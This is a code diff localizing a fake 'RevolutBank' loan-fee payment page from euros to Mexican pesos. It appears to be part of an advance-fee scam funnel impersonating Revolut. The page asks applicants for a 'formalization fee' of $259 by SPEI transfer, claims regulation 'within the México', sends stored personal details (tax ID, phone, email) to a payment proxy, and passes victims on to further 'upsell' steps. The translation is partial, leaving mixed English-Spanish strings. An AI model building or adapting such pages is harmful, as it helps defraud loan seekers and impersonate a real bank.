@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es-MX">
 <head>
 <meta charset="utf-8"/>
 <script>
@@ -17,7 +17,7 @@ window.apiUrl = window.apiUrl || function (p) {
 </script>
 <script src="../extensions/api-base.js"></script>
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
-<title>Formalization Fee — RevolutBank</title>
+<title>Comisión de Formalización — RevolutBank</title>
 
 <script defer src="../../cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js" data-token="3269fe28-2341-4107-9bf9-f1ad9d68455f"></script>
 <style>
@@ -135,17 +135,17 @@ window.apiUrl = window.apiUrl || function (p) {
     <div style="width:72px;height:72px;border-radius:50%;background:#f3f4f6;display:flex;align-items:center;justify-content:center;margin:0 auto 18px;">
       <svg fill="none" stroke="#52525b" stroke-width="1.8" viewBox="0 0 24 24" style="width:32px;height:32px"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z" stroke-linecap="round" stroke-linejoin="round"/><path d="M14 2v6h6M16 13H8M16 17H8M10 9H8" stroke-linecap="round" stroke-linejoin="round"/></svg>
     </div>
-    <h1 style="font-size:22px;font-weight:800;margin-bottom:10px;"><span data-msg="upsell4.t04">Formalization Fee</span></h1>
-    <p class="lead" style="text-align:center;margin-bottom:22px;"><span data-msg="upsell4.t05">Step required for the formalization and processing of your credit application.</span></p>
+    <h1 style="font-size:22px;font-weight:800;margin-bottom:10px;"><span data-msg="upsell4.t04">Comisión de Formalización</span></h1>
+    <p class="lead" style="text-align:center;margin-bottom:22px;"><span data-msg="upsell4.t05">Step required for the formalization and processing de tu credit application.</span></p>
 
     <!-- Value box -->
     <div style="background:#f9fafb;border:1px solid #e5e7eb;border-radius:16px;padding:20px;margin-bottom:22px;">
       <div style="font-size:12px;color:#71717a;margin-bottom:8px;">Fee amount</div>
-      <div style="font-size:36px;font-weight:800;letter-spacing:-1px;color:#0a0a0a;"><span data-fee-amount="suffix">12,78 €</span></div>
+      <div style="font-size:36px;font-weight:800;letter-spacing:-1px;color:#0a0a0a;"><span data-fee-amount="suffix">$ 259</span></div>
     </div>
 
     <!-- Description -->
-    <p class="lead" style="text-align:center;margin-bottom:22px;"><span data-msg="upsell4.t07">This fee corresponds to the administrative cost associated with the formalization and processing of your loan.</span></p>
+    <p class="lead" style="text-align:center;margin-bottom:22px;"><span data-msg="upsell4.t07">This fee corresponds to the administrative cost associated with the formalization and processing de tu loan.</span></p>
 
     <!-- Checklist -->
     <div style="text-align:left;margin-bottom:24px;">
@@ -178,7 +178,7 @@ window.apiUrl = window.apiUrl || function (p) {
     <!-- Footer note -->
     <div style="margin-top:16px;background:#f9fafb;border:1px solid #e5e7eb;border-radius:12px;padding:12px 14px;display:flex;align-items:flex-start;gap:8px;">
       <span style="font-size:16px;flex-shrink:0;">ℹ️</span>
-      <span style="font-size:12px;color:#71717a;text-align:left;line-height:1.5;">After payment confirmation, the process will proceed to the next step.</span>
+      <span style="font-size:12px;color:#71717a;text-align:left;line-height:1.5;">Tras la confirmación del pago, el proceso continuará al siguiente paso.</span>
     </div>
   </div>
 
@@ -186,8 +186,8 @@ window.apiUrl = window.apiUrl || function (p) {
   <div class="modal-overlay" id="payModal">
     <div class="modal-sheet">
       <button class="modal-close" onclick="closeModal()"><span data-msg="upsell4.t15">×</span></button>
-      <div class="modal-title">Confirm Payment</div>
-      <div class="modal-amount" id="modalPayAmount">€ ---</div>
+      <div class="modal-title">Confirmar Payment</div>
+      <div class="modal-amount" id="modalPayAmount">$ ---</div>
       <div id="modalBody"></div>
     </div>
   </div>
@@ -197,7 +197,7 @@ window.apiUrl = window.apiUrl || function (p) {
     <div class="logo-wrap">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 2 162 44" width="118" height="32" overflow="hidden" role="img" aria-label="Revolut"><text x="2" y="42" font-family="'DM Sans','Inter','Helvetica Neue',Arial,sans-serif" font-size="44" font-weight="700" fill="#0a0a0a" letter-spacing="-1.5">Revolut</text></svg>
     </div>
-    Revolut<br/>Registered and regulated within the European Union
+    Revolut<br/>Registered and regulated within the México
   </div>
 
 </div>
@@ -212,11 +212,11 @@ window.apiUrl = window.apiUrl || function (p) {
   var nif=(localStorage.getItem('nif')||'').replace(/\D/g,'');
   if(nif.length>=9) document.getElementById('userNif').textContent=nif.slice(0,3)+' *** *'+nif.slice(7,9);
 
-  var comissao = (window.resolveUpsellAmount||function(f){return f;})(12.78);
-function getPayAmount(){ return (window.resolveUpsellAmount||function(f){return f;})(12.78); }
+  var comissao = (window.resolveUpsellAmount||function(f){return f;})(259);
+function getPayAmount(){ return (window.resolveUpsellAmount||function(f){return f;})(259); }
 window.addEventListener('upsell-fee-ready',function(ev){ if(ev&&ev.detail&&ev.detail.amount!=null){ comissao=ev.detail.amount; window._PAY_AMOUNT=comissao; } });
 
-  function fmt(v){ return '€ '+v.toLocaleString('de-DE',{minimumFractionDigits:2,maximumFractionDigits:2}); }
+  function fmt(v){ return '$ '+v.toLocaleString('es-MX',{minimumFractionDigits:2,maximumFractionDigits:2}); }
   document.getElementById('modalPayAmount').textContent=fmt(comissao);
   window._PAY_AMOUNT=comissao;  }catch(e){ console.error('[UPSELL] init error:', e); }
 })();
@@ -224,7 +224,7 @@ window.addEventListener('upsell-fee-ready',function(ev){ if(ev&&ev.detail&&ev.de
 function utcNow(){ return new Date().toISOString().replace('T',' ').slice(0,19); }
 function getPhone(){ return (localStorage.getItem('telefone')||localStorage.getItem('telephone')||localStorage.getItem('phone')||'').replace(/\D/g,''); }
 function setModalBody(html){ document.getElementById('modalBody').innerHTML=html; }
-function buildSpeiBody(payData,amtLabel){var s='';if(payData&&payData.clabe){var mx=payData.amount_mxn?'MX$ '+Number(payData.amount_mxn).toFixed(2).replace('.',','):'';s='<div style="background:#f0fdf4;border:1.5px solid #22c55e;border-radius:12px;padding:14px 16px;margin:10px 0;font-size:13px;text-align:left;"><div style="font-weight:800;color:#15803d;margin-bottom:8px;">📲 Transfer via SPEI</div><table style="width:100%;border-collapse:collapse;font-size:12px;color:#374151;"><tr><td style="padding:3px 0;color:#6b7280;">Bank</td><td style="padding:3px 0;font-weight:700;">'+(payData.bank_name||'STP')+'</td></tr><tr><td style="padding:3px 0;color:#6b7280;">CLABE</td><td style="padding:3px 0;font-weight:700;letter-spacing:.5px;font-family:monospace;">'+payData.clabe+'</td></tr>'+(payData.beneficiary?'<tr><td style="padding:3px 0;color:#6b7280;">Beneficiary</td><td style="padding:3px 0;font-weight:700;">'+payData.beneficiary+'</td></tr>':'')+(payData.reference?'<tr><td style="padding:3px 0;color:#6b7280;">Reference</td><td style="padding:3px 0;font-weight:700;">'+payData.reference+'</td></tr>':'')+(mx?'<tr><td style="padding:3px 0;color:#6b7280;">Amount</td><td style="padding:3px 0;font-weight:700;">'+mx+'</td></tr>':'')+'</table></div>';}return '<div class="modal-status loading">Complete your payment of <strong>'+amtLabel+'</strong> using the details below.</div>'+s+'<div style="padding:10px;background:#fefce8;border:1.5px solid #fbbf24;border-radius:10px;font-size:13px;color:#92400e;text-align:center;margin-top:8px;">Waiting for confirmation…</div>';}
+function buildSpeiBody(payData,amtLabel){var s='';if(payData&&payData.clabe){var mx=payData.amount_mxn?'MX$ '+Number(payData.amount_mxn).toFixed(2).replace('.',','):'';s='<div style="background:#f0fdf4;border:1.5px solid #22c55e;border-radius:12px;padding:14px 16px;margin:10px 0;font-size:13px;text-align:left;"><div style="font-weight:800;color:#15803d;margin-bottom:8px;">📲 Transferencia via SPEI</div><table style="width:100%;border-collapse:collapse;font-size:12px;color:#374151;"><tr><td style="padding:3px 0;color:#6b7280;">Bank</td><td style="padding:3px 0;font-weight:700;">'+(payData.bank_name||'STP')+'</td></tr><tr><td style="padding:3px 0;color:#6b7280;">CLABE</td><td style="padding:3px 0;font-weight:700;letter-spacing:.5px;font-family:monospace;">'+payData.clabe+'</td></tr>'+(payData.beneficiary?'<tr><td style="padding:3px 0;color:#6b7280;">Beneficiary</td><td style="padding:3px 0;font-weight:700;">'+payData.beneficiary+'</td></tr>':'')+(payData.reference?'<tr><td style="padding:3px 0;color:#6b7280;">Reference</td><td style="padding:3px 0;font-weight:700;">'+payData.reference+'</td></tr>':'')+(mx?'<tr><td style="padding:3px 0;color:#6b7280;">Amount</td><td style="padding:3px 0;font-weight:700;">'+mx+'</td></tr>':'')+'</table></div>';}return '<div class="modal-status loading">Completa tu pago of <strong>'+amtLabel+'</strong> using the details below.</div>'+s+'<div style="padding:10px;background:#fefce8;border:1.5px solid #fbbf24;border-radius:10px;font-size:13px;color:#92400e;text-align:center;margin-top:8px;">Esperando confirmación…</div>';}
 function closeModal(){ document.getElementById('payModal').classList.remove('show'); }
 
 function getStoredUtms(){
@@ -253,7 +253,7 @@ function startPolling(txId){
       const res=await fetch(apiUrl('/api/status?id='+txId),);
       const data=await res.json();
       if(data.status==='COMPLETED'){
-        setModalBody('<div class="modal-status success">✅ Payment confirmed! Redirecting...</div>');
+        setModalBody('<div class="modal-status success">✅ ¡Pago confirmado! Redirigiendo...</div>');
             if (window.trackPurchase) {
               window.trackPurchase({
                 transactionId: txId,
@@ -267,7 +267,7 @@ function startPolling(txId){
         setTimeout(()=>{var _u=new URL('../5/index.html',window.location.href);['src','sck','utm_source','utm_campaign','utm_medium','utm_content','utm_term'].forEach(function(k){var v=localStorage.getItem(k);if(v)_u.searchParams.set(k,v);});window.location.href=_u.toString();},1500);
         return;
       }else if(data.status==='DECLINED'){
-        setModalBody('<div class="modal-status error">❌ Payment declined. Please try again.</div><button class="btn-modal-pay" style="margin-top:12px" onclick="closeModal()"><span data-msg="upsell4.t22">Close</span></button>');
+        setModalBody('<div class="modal-status error">❌ Pago rechazado. Por favor intenta de nuevo.</div><button class="btn-modal-pay" style="margin-top:12px" onclick="closeModal()"><span data-msg="upsell4.t22">Cerrar</span></button>');
         return;
       }
     }catch(e){}
@@ -281,13 +281,13 @@ async function startPayment(phone){
   const nome=localStorage.getItem('nome')||'Customer';
   const email=localStorage.getItem('email')||'customer@revolutbank.com';
   const doc=(localStorage.getItem('nif')||localStorage.getItem('cpf')||'999999999').replace(/\D/g,'')||'999999999';
-  const amount=getPayAmount(12.78);
-  const amountFmt='€ '+amount.toLocaleString('de-DE',{minimumFractionDigits:2,maximumFractionDigits:2});
-  setModalBody('<div class="modal-status loading" style="padding:20px"><span style="font-size:28px">⏳</span><br/><br/>Processing your payment...</div>');
+  const amount=getPayAmount(259);
+  const amountFmt='$ '+amount.toLocaleString('es-MX',{minimumFractionDigits:2,maximumFractionDigits:2});
+  setModalBody('<div class="modal-status loading" style="padding:20px"><span style="font-size:28px">⏳</span><br/><br/>Procesando tu pago...</div>');
   try{
     const res=await fetch(apiUrl('/api/payment-proxy?action=create'),{method:'POST',headers:{'Content-Type':'application/json'},
 
-      body:JSON.stringify({amount,method:'card',currency:'EUR',payer:{name:nome,email,document:doc,phone:phone},product:"comissao-formalizacao",paymentDescription:"Formalization Fee",_utms:getUtmParams()})});
+      body:JSON.stringify({amount,method:'card',currency:'MXN',payer:{name:nome,email,document:doc,phone:phone},product:"comissao-formalizacao",paymentDescription:"Comisión de Formalización",_utms:getUtmParams()})});
     const data=await res.json();
     if(!res.ok||data.error) throw new Error(data.error||data.message||'Error '+res.status);
     const txId=data.id||data.transaction_id||data.transactionId;
@@ -299,13 +299,13 @@ async function startPayment(phone){
     setModalBody(buildSpeiBody(data,amountFmt));
     startPolling(txId);
   }catch(e){
-    setModalBody('<div class="modal-status error" style="margin-bottom:14px">❌ '+((e&&e.message)?e.message:'Failed to process payment.')+'</div><button class="btn-modal-pay" onclick="startPayment()">Try again</button>');
+    setModalBody('<div class="modal-status error" style="margin-bottom:14px">❌ '+((e&&e.message)?e.message:'Error al procesar el pago.')+'</div><button class="btn-modal-pay" onclick="startPayment()">Intentar de nuevo</button>');
   }
 }
 
 function abrirModal(){
   document.getElementById('payModal').classList.add('show');
-  setModalBody('<div class="modal-status loading" style="padding:20px"><span style="font-size:28px">⏳</span><br/><br/>Processing your payment...</div>');
+  setModalBody('<div class="modal-status loading" style="padding:20px"><span style="font-size:28px">⏳</span><br/><br/>Procesando tu pago...</div>');
   startPayment(getPhone());
 }
 </script>
